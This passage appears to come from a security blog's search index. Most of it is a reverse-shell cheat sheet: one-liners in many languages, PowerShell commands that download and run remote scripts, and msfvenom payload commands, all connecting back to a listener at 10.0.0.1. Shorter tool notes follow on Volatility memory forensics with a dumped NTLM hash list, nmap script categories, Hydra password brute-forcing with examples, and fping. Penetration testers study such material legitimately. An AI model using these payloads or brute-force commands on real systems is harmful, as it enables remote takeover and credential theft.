'$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'Rubyruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4242\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'NOTE: Windows onlyruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",\"4242\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'Golangecho 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.goNetcat Traditionalnc -e /bin/sh 10.0.0.1 4242nc -e /bin/bash 10.0.0.1 4242nc -c bash 10.0.0.1 4242Netcat OpenBsdrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/fNetcat BusyBoxrm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/fNcatncat 10.0.0.1 4242 -e /bin/bashncat --udp 10.0.0.1 4242 -e /bin/bashOpenSSLAttacker:user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodesuser@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242oruser@attack$ ncat --ssl -vv -l -p 4242user@victim$ mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.0.0.1:4242 &gt; /tmp/s; rm /tmp/sTLS-PSK (does not rely on PKI or self-signed certificates)# generate 384-bit PSK# use the generated string as a value for the two PSK variables from belowopenssl rand -hex 48 # server (attacker)export LHOST=\"*\"; export LPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT# client (victim)export RHOST=\"10.0.0.1\"; export RPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; export PIPE=\"/tmp/`openssl rand -hex 4`\"; mkfifo $PIPE; /bin/sh -i &lt; $PIPE 2&gt;&amp;1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT &gt; $PIPE; rm $PIPEPowershellpowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')Awkawk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ printf \"shell&gt;\" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != \"exit\") close(s); }}' /dev/nullJavaRuntime r = Runtime.getRuntime();Process p = r.exec(\"/bin/bash -c 'exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done'\");p.waitFor();Java Alternative 1String host=\"127.0.0.1\";int port=4444;String cmd=\"cmd.exe\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();Java Alternative 2NOTE: This is more stealthyThread thread = new Thread(){ public void run(){ // Reverse shell here }}thread.start();TelnetIn Attacker machine start two listeners:nc -lvp 8080nc -lvp 8081In Victime machine run below command:telnet &lt;Your_IP&gt; 8080 | /bin/sh | telnet &lt;Your_IP&gt; 8081Warmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war &gt; reverse.warstrings reverse.war | grep jsp # in order to get the name of the fileLuaLinux onlylua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\"Windows and Linuxlua5.1 -e 'local host, port = \"10.0.0.1\", 4242 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'NodeJS(function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(4242, \"10.0.0.1\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing})();orrequire('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')or-var x = global.process.mainModule.require-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')orhttps://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.pyGroovyby frohoffNOTE: Java reverse shell also work for GroovyString host=\"10.0.0.1\";int port=4242;String cmd=\"cmd.exe\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();Groovy Alternative 1NOTE: This is more stealthyThread.start { // Reverse shell here}CCompile with gcc /tmp/shell.c --output csh &amp;&amp; csh#include &lt;stdio.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;int main(void){ int port = 4242; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.sin_family = AF_INET; revsockaddr.sin_port = htons(port); revsockaddr.sin_addr.s_addr = inet_addr(\"10.0.0.1\"); connect(sockt, (struct sockaddr *) &amp;revsockaddr, sizeof(revsockaddr)); dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2); char * const argv[] = {\"/bin/sh\", NULL}; execve(\"/bin/sh\", argv, NULL); return 0; }Dartimport 'dart:io';import 'dart:convert';main() { Socket.connect(\"10.0.0.1\", 4242).then((socket) { socket.listen((data) { Process.start('powershell.exe', []).then((Process process) { process.stdin.writeln(new String.fromCharCodes(data).trim()); process.stdout .transform(utf8.decoder) .listen((output) { socket.write(output); }); }); }, onDone: () { socket.destroy(); }); });}RevShellshttps://www.revshells.com/Meterpreter ShellWindows Staged reverse TCPmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exeWindows Stageless reverse TCPmsfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exeLinux Staged reverse TCPmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf &gt;reverse.elfLinux Stageless reverse TCPmsfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf &gt;reverse.elfOther platforms$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f elf &gt; shell.elf$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f exe &gt; shell.exe$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f macho &gt; shell.macho$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f asp &gt; shell.asp$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.jsp$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f war &gt; shell.war$ msfvenom -p cmd/unix/reverse_python LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.py$ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.sh$ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.pl$ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.phpSpawn TTY ShellIn order to catch a shell, you need to listen on the desired port. rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L].rlwrap nc 10.0.0.1 4242rlwrap -r -f . nc 10.0.0.1 4242-f . will make rlwrap use the current history file as a completion word list.-r Put all words seen on in- and output on the completion list.Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.:warning: OhMyZSH might break this trick, a simple sh is recommended The main problem here is that zsh doesn’t handle the stty command the same way bash or sh does. […] stty raw -echo; fg[…] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect ctrl+zecho $TERM &amp;&amp; tput lines &amp;&amp; tput cols# for bashstty raw -echofg# for zshstty raw -echo; fgresetexport SHELL=bashexport TERM=xterm-256colorstty rows &lt;num&gt; columns &lt;cols&gt; or use socat binary to get a fully tty reverse shellsocat file:`tty`,raw,echo=0 tcp-listen:12345Spawn a TTY shell from an interpreter/bin/sh -ipython3 -c 'import pty; pty.spawn(\"/bin/sh\")'python3 -c \"__import__('pty').spawn('/bin/bash')\"python3 -c \"__import__('subprocess').call(['/bin/bash'])\"perl -e 'exec \"/bin/sh\";'perl: exec \"/bin/sh\";perl -e 'print `/bin/bash`'ruby: exec \"/bin/sh\"lua: os.execute('/bin/sh') vi: :!bash vi: :set shell=/bin/bash:shell nmap: !sh mysql: ! bashAlternative TTY methodwww-data@debian:/dev/shm$ su - usersu: must be run from a terminalwww-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/nullwww-data@debian:/dev/shm$ su - userPassword: P4ssW0rDuser@debian:~$ Fully interactive reverse shell on WindowsThe introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.ConPtyShell uses the function CreatePseudoConsole(). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).Server Side:stty raw -echo; (stty size; cat) | nc -lvnp 3001Client Side:IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001Offline version of the ps1 available at –&gt; https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1References Reverse Bash Shell One Liner Pentest Monkey - Cheat Sheet Reverse shell Spawning a TTY Shell Obtaining a fully interactive shell" }, { "title": "Tools-volatility", "url": "/posts/Tools-volatility/", "categories": "tools", "tags": "tools", "date": "2022-01-01 00:00:00 +0800", "snippet": "Description Volatility是一款非常强大的内存取证工具,它是由来自全世界的数百位知名安全专家合作开发的一套工具, 可以用于windows,linux,mac osx,android等系统内存取证。Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态.helpVolatilityFoundation 波动率框架 2.6用法： Volatility - 内存取证分析平台。选项： -h, --help 列出所有可用选项及其默认值。 默认值可以在配置文件中设置 (/etc/volatilityrc) --conf-file=/root/.volatilityrc 基于用户的配置文件 -d, --debug 调试易变性 --plugins=PLUGINS 要使用的附加插件目录（冒号分隔） --info 打印所有注册对象的信息 --cache-directory=/root/.cache/volatility 存放缓存文件的目录 --cache 使用缓存 --tz=TZ 设置 (Olson) 时区以显示时间戳 使用 pytz（如果已安装）或 tzset -f filename，--profile=文件名 打开图像时使用的文件名 --profile=Win7SP1x64 要加载的配置文件的名称（使用 --info 查看列表支持的配置文件） -l file:///root/vol/1.vmem, --location=file:///root/vol/1.vmem 从中加载地址空间的 URN 位置 -w, --write 启用写支持 --dtb=DTB DTB 地址 --shift=SHIFT Mac KASLR 移位地址 --output=text 以这种格式输出（支持是特定于模块的，请参阅下面的模块输出选项） --output-file=OUTPUT_FILE 在此文件中写入输出 -v, --verbose 详细信息 --physical_shift=PHYSICAL_SHIFT Linux内核物理移位地址 --virtual_shift=VIRTUAL_SHIFT Linux内核虚拟移位地址 -g KDBG, --kdbg=KDBG 指定一个 KDBG 虚拟地址（注意：对于 64 位Windows 8 及以上系统的地址KdCopyDataBlock) --force 强制使用可疑配置文件 --cookie=COOKIE 指定nt!ObHeaderCookie的地址（对仅限 Windows 10） -k KPCR, --kpcr=KPCR 指定具体的KPCR地址支持的插件命令：amcache 打印 AmCache 信息apihooks 检测进程和内核内存中的 API 挂钩atom 打印会话和窗口站原子表atomscan 原子表的池扫描器auditpol 从 HKLM\\SECURITY\\Policy\\PolAdtEv 打印出审计策略bigpools 使用 BigPagePoolScanner 转储大页面池bioskbd 从实模式内存中读取键盘缓冲区cachedump 从内存中转储缓存的域哈希 回调打印系统范围的通知例程 剪贴板 提取 windows 剪贴板的内容cmdline 显示进程命令行参数cmdscan 通过扫描 _COMMAND_HISTORY 提取命令历史记录consoles 通过扫描 _CONSOLE_INFORMATION 提取命令历史记录crashinfo 转储崩溃转储信息 用于 tagDESKTOP（台式机）的deskscan Poolscanerdevicetree 显示设备树dlldump 从进程地址空间转储 DLLdlllist 打印每个进程加载的 dll 列表driverirp 驱动程序 IRP 挂钩检测drivermodule 将驱动程序对象与内核模块相关联driverscan 驱动程序对象的池扫描器dumpcerts 转储 RSA 私有和公共 SSL 密钥dumpfiles 提取内存映射和缓存文件dumpregistry 将注册表文件转储到磁盘editbox 显示有关编辑控件的信息。 （列表框实验。）envars 显示进程环境变量eventhooks 在 windows 事件挂钩上打印详细信息 文件对象的文件扫描池扫描程序gahti 转储 USER 句柄类型信息gditimers 打印已安装的 GDI 计时器和回调getservicesids 获取 Registry 中服务的名称并返回计算的 SIDgetsids 打印拥有每个进程的 SID 处理每个进程的打开句柄的打印列表hashdump 从内存中转储密码哈希 (LM/NTLM)hibinfo 转储休眠文件信息hivedump 打印出一个蜂巢hivelist 打印注册表配置单元列表。 用于注册表配置单元的 hivescan 池扫描程序hpaextract 从 HPAK 文件中提取物理内存hpakinfo 有关 HPAK 文件的信息iehistory 重建 Internet Explorer 缓存/历史imagecopy 将物理地址空间复制为原始 DD 映像imageinfo 识别图像的信息impscan 扫描对导入函数的调用joblinks 打印进程作业链接信息kdbgscan 搜索并转储潜在的 KDBG 值kpcrscan 搜索并转储潜在的 KPCR 值ldrmodules 检测 unlin基本命令格式volatility -f [image] --profile=[profile] [plugin]示例root@kali:~/vol# volatility -f 1.vmem imageinfoVolatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/root/vol/1.vmem) PAE type : No PAE DTB : 0x187000L KDBG : 0xf800040580a0L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80004059d00L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2020-10-15 06:34:03 UTC+0000 Image local date and time : 2020-10-15 14:34:03 +0800 从内存文件中获取用户admin的密码并破解，将该密码作为flag值提交(密码长度为6个字符)； 获取内存文件中系统的IP地址，将IP地址作为flag值提交； 获取内存文件中系统的主机名，将主机名作为flag值提交； 内存文件的系统中存在挖矿进程，将矿池的IP地址作为flag值提交； 内存文件的系统中恶意进程在系统中注册了服务，请将服务名称作为flag值提交。 从内存中转储密码哈希 (LM/NTLM)root@kali:~/vol# volatility -f 1.vmem --profile=Win7SP1x64 hashdumpVolatility Foundation Volatility Framework 2.6Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::test:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::admin:1001:aad3b435b51404eeaad3b435b51404ee:acf4a59b219c8eec8aa2ca7b3ba9b7dc:::" }, { "title": "Tools-nmap", "url": "/posts/Tools-nmap/", "categories": "tools", "tags": "tools", "date": "2022-01-01 00:00:00 +0800", "snippet": "使用系列的nmap NSE 进行检查#nmap脚本主要分为以下几类，在扫描时可根据需要设置–script=类别这种方式进行比较笼统的扫描：auth: 负责处理鉴权证书（绕开鉴权）的脚本 broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务brute: 提供暴力破解方式，针对常见的应用如http/snmp等default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等dos: 用于进行拒绝服务攻击exploit: 利用已知的漏洞入侵系统external: 利用第三方的数据库或资源，例如进行whois解析fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽malware: 探测目标机是否感染了病毒、开启了后门等信息safe: 此类与intrusive相反，属于安全性脚本version: 负责增强服务与版本扫描（Version Detection）功能的脚本vuln: 负责检查目标机是否有常见的漏洞（Vulnerability）" }, { "title": "Tools-hydra", "url": "/posts/Tools-hydra/", "categories": "tools", "tags": "tools", "date": "2022-01-01 00:00:00 +0800", "snippet": "#help一个非常快速的网络登录破解程序，支持许多不同的服务选项： -R 恢复以前中止/崩溃的会话 -我忽略现有的还原文件（不要等待 10 秒） -S 执行 SSL 连接 -s PORT 如果服务位于不同的默认端口，请在此处定义 -l LOGIN 或 -L FILE 使用 LOGIN 名称登录，或从 FILE 加载多个登录 -p PASS 或 -P FILE 尝试密码 PASS，或从 FILE 加载多个密码 -x MIN:MAX:CHARSET 密码暴力生成，输入“-x -h”获取帮助 -y 禁止在暴力破解中使用符号，见上文 -r 对选项 -x 使用非随机洗牌方法 -e nsr 尝试“n”空密码，“s”作为通过登录和/或“r”反向登录 -u 循环用户，而不是密码（有效！隐含在 -x 中） -C FILE 冒号分隔的“login:pass”格式，而不是 -L/-P 选项 -M FILE 要攻击的服务器列表，每行一个条目，':' 指定端口 -o FILE 将找到的登录名/密码对写入 FILE 而不是 stdout -b FORMAT 指定 -o FILE 的格式：text(default), json, jsonv1-l admin\t指定用户名-p 12345\t指定密码-L user.txt\t指定用户名字典-P pass.txt\t指定密码字典-vV\t\t\t显示过程信息-t 10\t\t线程 最大 64-s 22\t\t指定服务端口-S\t\t\t使用SSL协议连接-R \t\t\t根据上一次进度继续破解-C user:pass-e &lt;ns&gt;\t\tn空密码试探-w &lt;time&gt;\t超时hydra 使用示例语法hyara -l admin -p 123456 ssh://IPhydra IP telnet -l admin -P pass.txt -vVhydra IP telnet -P user.txt -P pass.txt -vVhydra IP telnet -l admin -P pass.txt -vV -t 10爆破ssh服务暴力破解 Window ssh 服务 10个线程hydra -l Administrator -P rockyou.txt ssh://172.16.1.200 -t 10爆破运行在33060端口的mysql服务-s 指定端口hydra -l root -P rockyou.txt mysql://172.16.1.200 -s 33060 -t 10http-Basichydra 10.0.1.101 http-head \"/development\" -l admin -P pass# Authorization: Basichttp-post# 查看帮助信息hydra http-post-form -Uhydra IP http-form-post \"/from/fromtpage.php:usr=admin&amp;pwd=^PASS^:INVALID LOGIN\" -l admin -P rockyou.txt -vV -fhydra IP http-post-from \"/login.php:uname=^USER^&amp;pass=^PASS^:fales\" -l admin -P rockyou.txt -f -vVhttp登录暴力破解-判断成功/失败\"login.php:user=^USER^&amp;pass=^PASS^:S=logout\"# S 登录成功后才有的字符串# 可能登录成功后的页面有 logout 字符串\"login.php:user=^USER^&amp;pass=^PASS^:F=error\"# F 登录失败时才有的，成功则没有" }, { "title": "Tools-fping", "url": "/posts/Tools-fping/", "categories": "tools", "tags": "tools", "date": "2022-01-01 00:00:00 +0800", "snippet": "fping 是一个类似 ping 的程序，它使用 Internet 控制消息协议 (ICMP) 回显请求来确定目标主机是否正在响应。fping 与 ping 的不同之处在于您可以在命令行上指定任意数量的目标，或者指定一个包含要 ping 的目标列表的文件。fping 不会在超时或回复之前发送到一个目标，而是发送一个 ping 数据包并以循环方式移动到下一个目标。向网络主机发送 ICMP ECHO_REQUEST 数据包Helproot@kali:~# fping -hUsage: fping [options] [targets...]Probing options: -4, --ipv4 仅 ping IPv4 地址 -6, --ipv6 仅 ping IPv6 地址 -b, --size=BYTES 要发送的 ping 数据量，以字节为单位（默认值：56） -B, --backoff=N 将指数退避因子设置为 N（默认值：1.5） -c, --count=N 计数模式：向每个目标发送 N 个 ping -f, --file=FILE 从文件中读取目标列表（ - 表示标准输入） -g, --generate 生成目标列表（仅当未指定 -f 时） （在目标列表中给出开始和结束 IP，或 CIDR 地址） （例如 fping -g 192.168.1.0 192.168.1.255 或 fping -g 192.168.1.0/24） -H, --ttl=N 设置 IP TTL 值（Time To Live hops） -I, --iface=IFACE 绑定到特定接口 -l, --loop 循环模式：永远发送 ping -m, --all 使用提供的主机名的所有 IP（例如 IPv4 和 IPv6），与 -A 一起使用 -M, --dontfrag 设置不分片标志 -O, --tos=N 在 ICMP 数据包上设置服务类型 (tos) 标志 -p, --period=Ping 数据包到一个目标之间的 MSEC 间隔（以毫秒为单位） （在循环和计数模式下，默认值：1000 ms） -r, --retry=N 重试次数（默认：3） -R, --random 随机数据包数据（用于阻止链接数据压缩） -S, --src=IP 设置源地址 -t, --timeout=MSEC 单个目标初始超时（默认值：500 毫秒， 除了 -l/-c/-C，它的 -p 周期长达 2000 毫秒）输出选项： -a, --alive 显示活动的目标 -A, --addr 按地址显示目标 -C，--vcount=N 同-c，以详细格式报告结果 -D, --timestamp 在每个输出行之前打印时间戳 -e, --elapsed 显示返回数据包经过的时间 -i, --interval=发送 ping 数据包之间的 MSEC 间隔（默认值：10 毫秒） -n, --name 按名称显示目标（-d 等效） -N, --netdata 输出与 netdata 兼容（需要 -l -Q） -o, --outage 显示累计中断时间（丢包*包间隔） -q, --quiet quiet（不显示每个目标/每个 ping 的结果） -Q, --squiet=SECS 与 -q 相同，但每 n 秒显示一次摘要 -s, --stats 打印最终统计数据 -u, --unreach 显示无法访问的目标 -v, --version 显示版本 -x, --reachable=N 显示 &gt;=N 主机是否可达****使用示例-g 扫描指定网段，将IP存活信息重定向到show.txtfping -g 172.16.1.1/24 &gt; show.txt能ping通的 和 ping不通的 都显示# head show.txt 172.16.1.2 is alive172.16.1.3 is alive172.16.1.7 is alive172.16.1.50 is alive172.16.1.52 is alive172.16.1.99 is alive172.16.1.200 is alive172.16.1.254 is alive172.16.1.1 is unreachable172.16.1.4 is unreachable...-g -a 扫描指定网段，将IP存活的重定向到show.txtfping -g -a 172.16.1.1/24 &gt; show.txt只输出ping的通的ip# head show.txt 172.16.1.2172.16.1.3172.16.1.7172.16.1.50172.16.1.52172.16.1.59172.16.1.99172.16.1.200172.16.1.254常用的就这写，你也可以继续扩展" } ]
